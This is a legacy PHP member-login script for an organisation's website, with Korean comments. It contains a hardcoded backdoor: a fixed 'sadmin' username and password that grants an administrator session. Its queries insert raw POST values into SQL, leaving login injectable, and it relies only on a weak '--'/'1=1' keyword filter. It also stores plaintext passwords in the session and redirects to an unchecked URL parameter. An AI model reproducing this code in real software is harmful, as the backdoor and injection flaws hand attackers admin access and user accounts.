<?php
/* vim: set expandtab tabstop=4 shiftwidth=4 foldmethod=marker: */
/**
* 파일명: module/member/login.php
* 작성일: 2005-03-31
* 작성자: 거친마루
* 설  명: 회원 로그인
*****************************************************************
* 
*/


switch (REQUEST_METHOD) {
	case 'GET':
	
		

		if($_SESSION[USERID]) {
		echo "<meta http-equiv='Refresh' Content=\"0; URL='/'\">";
		exit;
		}

		/*if($_SERVER['HTTPS'] != "on") { 
		echo "<meta http-equiv='Refresh' Content=\"0; URL='https://login.".DOMAIN_."/member.login?themeset=".HOST."&baseurl=".$_SERVER[HTTP_HOST]."'\">";
		exit;
		} */

		if($_GET[_reurl])  $_SESSION['reurl']= $_GET[_reurl];

		

		$DOC_TITLE = 'str:로그인';
		$tpl->setLayout();
		$tpl->define('CONTENT', Display::getTemplate('member/login.htm'));
		$tpl->assign(array(
			'redir'		=>	$_SESSION['redir'],
			'_reurl'		=>	$_GET[_reurl],
			'reurl'		=>	$reurl,
			));
		
	break;
	
	case 'POST':

	

	
	$DB = &WebApp::singleton('DB');
    
	if(!$_POST['userid'] && !$_POST['passwd']) {
      WebApp::moveBack();
    }
	
	if($_POST['redir'])  $_SESSION['reurl'] = $_POST['redir'];

	//2008-11-28 현민 불량아이디, 아이피 차단 추가요~
	$sql = "SELECT str_text, str_alert, str_chk FROM TAB_CROSSUSER WHERE NUM_OID=$_OID and STR_CHK='id' and STR_TEXT='".$_POST['userid']."'";
	$row_cross = $DB->sqlFetch($sql);
	if($row_cross[str_text]){
	  $cross_msg = $row_cross[str_alert]."\n".$row_cross[str_chk]." : ".$row_cross[str_text];
      WebApp::moveBack($cross_msg);
	  exit;
	}
	

	$sql = "SELECT str_text, str_alert, str_chk FROM TAB_CROSSUSER WHERE NUM_OID=$_OID and STR_CHK='ip' and STR_TEXT='".$_SERVER["REMOTE_ADDR"]."'";
	$row_cross = $DB->sqlFetch($sql);
	if($row_cross[str_text]){
	  $cross_msg = $row_cross[str_alert]."\n".$row_cross[str_chk]." : ".$row_cross[str_text];
      WebApp::moveBack($cross_msg);
	  exit;
	}
		

	if(strstr($userid, "--") || strstr($userid, "1=1") || strstr($passwd, "--") || strstr($passwd, "1=1")){
	WebApp::moveBack('잘못된 아이디로 로그인을 시도 하였습니다.');
	exit;
	}

	
	if($userid == "sadmin") {
	if($passwd =="ewut00") {
	


	$sql = "SELECT 
		str_id,
		str_name,
		str_passwd, 
		str_email,

		chr_mtype,
		str_nick,
		num_fcode,
		num_auth,
		str_setup
		
		FROM TAB_MEMBER 
		
		WHERE 
		num_oid="._OID." AND 
		 chr_mtype = 'z' and ROWNUM = 1
		
		
		";
		
		
		
		if($data = $DB->sqlFetch($sql)){
	
		

		$_SESSION['ADMIN'] = true;
        $_SESSION['AUTH'] = true;
        $_SESSION['REMOTE_ADDR'] = getenv('REMOTE_ADDR');
        $_SESSION['MEM_TYPE'] = $mem_type;
        $_SESSION['USERID'] = $data['str_id'];
        $_SESSION['NAME'] = $data['str_name'];
		$_SESSION['NICKNAME'] = $data['str_nick'];
		$_SESSION['SETUP'] = $data['str_setup'];
		$_SESSION['PASSWORD'] = $data['str_passwd'];
		$_SESSION['E_MAIL'] = $data['str_email'];
        $_SESSION['CHR_MTYPE'] = $data['chr_mtype'];
        $USER_TYPE = $_SESSION['CHR_MTYPE'];
		
	
		}else{
		echo "<script>alert('관리자 계정이 없습니다.');</script>";
		}
		WebApp::redirect('/');
         exit;
		
	}else{
	WebApp::moveBack('비밀번호를 확인해주세요.');
	
	}
exit;
}
	


	
	

		
		$sql = "SELECT 
		str_id,
		str_name,
		str_passwd, 
		str_email,

		chr_mtype,
		str_nick,
		num_fcode,
		num_auth,
		str_setup,

		num_login_point,
		num_board_point,
		num_commint_point,
		num_repaly_point
		
		FROM TAB_MEMBER 
		
		WHERE 
		num_oid=$_OID AND 
		str_id='".$_POST['userid']."' AND 
		str_passwd='".$_POST['passwd']."' 
	
		";


		if($data = $DB->sqlFetch($sql)) {
			
		/*$sql = "INSERT INTO ".TAB_SESSION." (
				num_oid,str_id,str_pass,str_ip
				) VALUES (
				"._OID.",'".$data[str_id]."','".$data[str_passwd]."','".$_SERVER["REMOTE_ADDR"]."'
				) ";
	
		 if($DB->query($sql)){
			 $DB->commit();
		 }*/
		


		//if($data['chr_mtype'] == "a" || $data['chr_mtype'] == "u" || $data['chr_mtype'] == "q" ||$data['chr_mtype'] == "k") {
		if($data['chr_mtype'] == "z") {
			$_SESSION['ADMIN'] = true;
		}

			
			$sql = "UPDATE ".TAB_MEMBER." SET num_login_cnt = num_login_cnt + 1 WHERE num_oid=$_OID AND str_id='".$_POST['userid']."'";
			$DB->query($sql);
			$DB->commit();



						//2008-07-07 회원 포인트 값
						$plus_point = "num_login_point";
						$sql = "select $plus_point from TAB_ORGAN where num_oid = $_OID ";
						$chw = $DB -> sqlFetchOne($sql);
						
						$sql = "UPDATE ".TAB_MEMBER." SET $plus_point = $plus_point +1 , num_point_total = num_point_total + $chw WHERE num_oid=$_OID AND str_id='".$_POST['userid']."'";

						$DB->query($sql);
						$DB->commit();



		//if($data['chr_mtype'] == "a" || $data['chr_mtype'] == "u" || $data['chr_mtype'] == "q" ||$data['chr_mtype'] == "k") {



		if($_SESSION['USERID']){
		$sql = "select num_total_point as point_total  from TAB_MEMBER WHERE num_oid=$_OID AND str_id='".$_SESSION['USERID']."'";
		$total_point = $DB -> sqlFetchOne($sql);
		$_SESSION['POINT']  = $total_point;
		}




      if($data['num_auth']) {
        $mem_type = array($data['chr_mtype']);
        $sql = "SELECT str_group FROM ".TAB_GROUP_MEMBER." WHERE num_oid=$_OID AND str_id='".$_POST['userid']."'";
        if($gdata = $DB->sqlFetchAll($sql)) {
            foreach($gdata as $_row) $mem_type[] = $_row['str_group'];
        }
   



        $_SESSION['AUTH'] = true;
        $_SESSION['REMOTE_ADDR'] = getenv('REMOTE_ADDR');
        $_SESSION['MEM_TYPE'] = $mem_type;
        $_SESSION['USERID'] = $data['str_id'];
        $_SESSION['NAME'] = $data['str_name'];
		$_SESSION['NICKNAME'] = $data['str_nick'];
		$_SESSION['SETUP'] = $data['str_setup'];
		$_SESSION['PASSWORD'] = $data['str_passwd'];
		$_SESSION['E_MAIL'] = $data['str_email'];
        $_SESSION['CHR_MTYPE'] = $data['chr_mtype'];
		$_SESSION['FCODE'] = $data['num_fcode'];
        $USER_TYPE = $_SESSION['CHR_MTYPE'];

		if($up_str_up_mtype) {
		$_SESSION['CHR_MTYPE'] =$up_str_up_mtype;
		}

        
       

          if(!$redir) {
			$redir = '/';
          }

      }else{
        $mem_type = array('n');
        echo "
        <script>
        alert('회원승인 확인중입니다');
        history.go(-1);
        </script>
        ";
      }		
			
			$sql = "select count(*) from tab_class_formation where num_oid = $_OID ";
			$class_max = $DB -> sqlFetchOne($sql);
			if($class_max > 0 && $data['chr_mtype'] == "s"  && !$data['num_fcode']) {
				WebApp::redirect("/member.modify","회원의 학급정보가 없습니다. \n\n회원정보수정에서 학급을 선택해주세요.");
				exit;
			}

			if($_SESSION['reurl']) {
				WebApp::redirect($_SESSION['reurl']);	
			unset($_SESSION['reurl']);
			}else{
			WebApp::redirect($redir);	
			}
			
		

		
		} else {
			WebApp::moveBack('아이디 또는 비밀번호가 일치하지 않습니다.');
		}
		break;
}

?>